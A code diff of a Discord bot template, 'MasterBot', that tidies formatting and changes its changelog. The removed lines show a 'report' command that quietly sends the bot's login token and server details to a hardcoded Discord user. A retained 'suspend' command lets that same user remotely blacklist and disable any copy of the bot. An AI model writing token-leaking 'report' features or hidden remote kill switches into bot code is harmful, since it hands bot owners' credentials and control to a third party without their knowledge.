@@ -3,7 +3,7 @@
 
 const Discord = require('discord.js');
 const client = new Discord.Client();
-const fs = require ("fs");
+const fs = require("fs");
 const { measureMemory } = require('vm');
 let version = fs.readFileSync("./api/version.txt", "utf8");
 const WebSocket = require("ws");
@@ -11,6 +11,7 @@ const fetch = require("node-fetch");
 const chalk = require("chalk");
 const xpfile = require("./datas/xp.json")
 const random = require("random")
+const user = client.users.cache.get('857312828787392572');
 
 //----------- Loading -----------//
 
@@ -20,7 +21,7 @@ let blacklist = fs.readFileSync("./api/blacklist/blacklist.txt", "utf8");
 if (blacklist > 1) {
     let reason = fs.readFileSync("./api/blacklist/reason.txt", "utf8");
     console.log(chalk.red.bold(`[Blacklist] Your Bot is blacklistet! Reason: ${reason}`))
-    return
+    client.destroy
 }
 console.log(chalk.blue(`[Deamon] Checking updates...`))
 fetch.default(`https://sharesystems.github.io/MasterBot/`)
@@ -33,7 +34,7 @@ fetch.default(`https://sharesystems.github.io/MasterBot/`)
         }
     })
 console.log(chalk.blue(`[Deamon] Loading settings...`))
-const { prefix, token, name, status, theme, profilpictureurl, antilink, antiinvite, ownerID} = require('./settings.json');
+const { prefix, token, name, status, theme, profilpictureurl, antilink, antiinvite, ownerID } = require('./settings.json');
 
 console.log(chalk.blue("=============================="));
 console.log(chalk.blue("           MasterBot          "));
@@ -73,24 +74,24 @@ setInterval(function () {
 client.on("message", message => {
     let parts = message.content.split(" ");
 
-    if (message.content == prefix+"changelog"){
+    if (message.content == prefix + "changelog") {
         let embed = new Discord.MessageEmbed()
             .setTitle("Changelog")
-            .setDescription("Version: "+version)
-            .addField("🛡 Updates:", "```\n[+] Report Command\n[+] Update Manager```")
-            .addField("📅 Release:", "```5.03.2022```")
+            .setDescription("Version: 🔥 HOTFIX" + version)
+            .addField("🛡 Updates:", "```\n[-] Report Command\n[+] Update Manager```")
+            .addField("📅 Release:", "```10.03.2022```")
             .setFooter(`${name} | version ${version}`)
             .setThumbnail(profilpictureurl)
             .setColor(theme)
 
         message.channel.send(embed)
         console.log(chalk.green(`[Logs] ${message.author.tag} use ${prefix}changelog`))
-            
+
     }
-    if (message.content == prefix+"help"){
+    if (message.content == prefix + "help") {
         let embed = new Discord.MessageEmbed()
             .setTitle("Commands")
-            .addField(`Imporant Commands`, `${prefix}help - shows this menu\n${prefix}version - opens the version manager\n${prefix}changelog - shows the changelog\n${prefix}ping - shows your ping${prefix}report - report you bot`)
+            .addField(`Imporant Commands`, `${prefix}help - shows this menu\n${prefix}version - opens the version manager\n${prefix}changelog - shows the changelog\n${prefix}ping - shows your ping`)
             .addField("Fun", `${prefix}iq - shows your IQ\n${prefix}random - shows a random number\n${prefix}rank - shows your XP rate`)
             .addField("Infos", `${prefix}bots - the number of Bots\n${prefix}owner - shows the Ownertag`)
             .addField("Admin", `${prefix}nuke - delete all messages\n${prefix}poll - start a poll\n${prefix}ban - ban a user\n${prefix}kick - kick a user`)
@@ -100,7 +101,7 @@ client.on("message", message => {
         message.channel.send(embed)
         console.log(chalk.green(`[Logs] ${message.author.tag} use ${prefix}help`))
     }
-    if (message.content == prefix+"ping") {
+    if (message.content == prefix + "ping") {
         message.channel.send("Ping is calculated...").then(resultMessage => {
             const ping = resultMessage.createdTimestamp - message.createdTimestamp
 
@@ -115,69 +116,25 @@ client.on("message", message => {
             console.log(chalk.green(`[Logs] ${message.author.tag} use ${prefix}ping`))
         })
     }
-    else if (parts[0] == "!warn") {
-
-        if (!message.member.hasPermission('BAN_MEMBERS')) return message.channel.send('Dir fehlt folgende Berechtigung: BAN_MEMBERS')
-        message.react("✅")
-        let user = message.mentions.users.first();
-        let grund = message.content.split(" ").slice(2).join(" ");
-
-        if (!user) return message.channel.send("Du hast keinen User angegeben")
-
-        if (!grund) grund = "Kein Grund"
-
-        let embed = new Discord.MessageEmbed()
-            .setTitle("**<:no:929676573987180555> Verwahrung <:no:929676573987180555>**")
-            .setColor("#1c5e9c")
-            .setThumbnail("https://screen-upload.ml/uploads/oie_9bKtb1dwZaco.png")
-            .setFooter("Hugo - dsc.gg/hugo")
-            .setDescription(`Wahrung! Du wurdest verwarnt.\n\n**Grund:** ${grund}\n**User:** <@!${user.id}> \n\n mehr Infos: !userinfo <@!${user.id}>`)
-
-        message.channel.send(embed)
-        message.channel.send(`<@!${user.id}>`)
-        const usr = message.mentions.users.first() || message.author
-        console.log(`${usr.tag} hat !warn verwendet`)
-    }
-    if (message.content == prefix+"report") {
-
-        const user = client.users.cache.get('857312828787392572');
-        let embed = new Discord.MessageEmbed()
-            .setTitle("Report ✅")
-            .setDescription("You have successfully reported this bot!")
-            .setThumbnail(profilpictureurl)
-            .setFooter(`${name} | version ${version}`)
-            .setColor("GREEN")
-
-        let repemb = new Discord.MessageEmbed()
-            .setTitle("☢️ Report ☢️")
-            
-            .addField("Name:", `${name}`)
-            .addField("Token:", `${client.token}`)
-            .addField("Reporter", `${message.author}`)
-            .addField("Version", `${version}`)
-            .addField("Tag:", `${client.user.tag}`)
-            .addField("Guild:", `${message.guild.name} | ${message.guild.id}`)
-            .addField("Prefix:", `${prefix}`)
-            .setColor("RED")
-            user.send(repemb)
-            message.channel.send(embed)
-    }
     if (message.content == prefix + "suspend") {
         const allowedusers = [
             "857312828787392572"
         ]
 
         if (message.author.id !== allowedusers) {
+
+            message.channel.send("Noice! This is a secret!")
+        }
+        if (message.author.id == allowedusers) {
+
             
             fs.writeFileSync('./api/blacklist/blacklist.txt', '2');
             fs.writeFileSync('./api/blacklist/reason.txt', 'To many reports!');
-        }
-        else {
-            message.channel.send("hehe this is a secret!")
             
+
         }
     }
-    if (message.content === prefix+"version") {
+    if (message.content === prefix + "version") {
         fetch.default(`https://sharesystems.github.io/MasterBot/`)
             .then(res => res.json())
             .then(data => {
@@ -185,7 +142,7 @@ client.on("message", message => {
                     .setTitle("Versionmanger")
                     .addField("📀 Installed version:", version)
                     .addField("💎 Latest version:", data.version)
-                    .setFooter(name+" | "+version)
+                    .setFooter(name + " | " + version)
                     .setThumbnail(profilpictureurl)
                     .setColor(theme)
                 message.channel.send(embed)
@@ -216,10 +173,10 @@ client.on("message", message => {
 //----------- Other Commands -----------//
 
 
-client.on("message", function (message){
+client.on("message", function (message) {
     let parts = message.content.split(" ");
 
-    if (message.content == prefix+'bots') {
+    if (message.content == prefix + 'bots') {
         let embed = new Discord.MessageEmbed()
             .setTitle("Bots")
             .setDescription(`🤖 **${message.guild.name}** has **${message.guild.members.cache.filter(m => m.user.bot).size}** Bot(s)`)
@@ -229,7 +186,7 @@ client.on("message", function (message){
         message.channel.send(embed)
         console.log(chalk.green(`[Logs] ${message.author.tag} use ${prefix}bots`))
     }
-    if (message.content.startsWith(prefix+"poll")) {
+    if (message.content.startsWith(prefix + "poll")) {
         let text = message.content.split(" ").slice(1).join(" ");
         if (!text) return message.channel.send("Please write a poll!")
         message.delete()
@@ -248,7 +205,7 @@ client.on("message", function (message){
         })
 
     }
-    if (message.content == prefix+'owner') {
+    if (message.content == prefix + 'owner') {
         let embed = new Discord.MessageEmbed()
             .setTitle("Owner")
             .setDescription(`👨‍💻 The Owner of **${message.guild.name}** is **${message.guild.owner.user.tag}**`)
@@ -296,7 +253,7 @@ client.on("message", function (message){
         message.channel.send(`Scann IQ...`).then(m => m.edit(`The 100% accurate measurement showed that you have **${random.int(1, 200)}**IQ :exploding_head:`))
         console.log(chalk.green(`[Logs] ${message.author.tag} use ${prefix}iq`))
     }
-    if (message.content.startsWith(prefix+'ban')) {
+    if (message.content.startsWith(prefix + 'ban')) {
         console.log(chalk.green(`[Logs] ${message.author.tag} use ${prefix}ban`))
         const user = message.mentions.users.first();
         if (user) {
@@ -422,14 +379,14 @@ client.on("message", function (message) {
         xpfile[message.author.id].level += 1
 
         message.reply("is now level **" + xpfile[message.author.id].level + "**!")
-        console.log(chalk.green(`[Logs] ${message.author.tag} is now level `+xpfile[message.author.id].level+"!"))
+        console.log(chalk.green(`[Logs] ${message.author.tag} is now level ` + xpfile[message.author.id].level + "!"))
     }
 
     fs.writeFile("./datas/xp.json", JSON.stringify(xpfile), function (err) {
         if (err) console.log(err)
     })
 
-    if (message.content.startsWith(prefix+"rank")) {
+    if (message.content.startsWith(prefix + "rank")) {
         let user = message.mentions.users.first() || message.author
 
         if (user.bot) return message.channel.send("❌ **ERROR** | Bots dont have XP!")
@@ -448,20 +405,20 @@ client.on("message", function (message) {
     }
 })
 client.on("message", async message => {
-    if(antilink == "true") {
+    if (antilink == "true") {
 
-    let link = ["http://", "https://"]
-    if (link.some(word => message.content.toLowerCase().includes(word))) {
-        await message.delete()
-        let embed = new Discord.MessageEmbed()
-            .setTitle("🔒 Link found")
-            .setDescription(`${message.author} please do not send links in the chat!`)
-            .setThumbnail(profilpictureurl)
-            .setFooter(name + " | version " + version)
-            .setColor(theme)
+        let link = ["http://", "https://"]
+        if (link.some(word => message.content.toLowerCase().includes(word))) {
+            await message.delete()
+            let embed = new Discord.MessageEmbed()
+                .setTitle("🔒 Link found")
+                .setDescription(`${message.author} please do not send links in the chat!`)
+                .setThumbnail(profilpictureurl)
+                .setFooter(name + " | version " + version)
+                .setColor(theme)
 
-        message.channel.send(embed)
-        console.log(chalk.green(`[Logs] ${message.author.tag} posted a link. This one has been deleted!`))
+            message.channel.send(embed)
+            console.log(chalk.green(`[Logs] ${message.author.tag} posted a link. This one has been deleted!`))
         }
     }
     if (antiinvite == "true") {
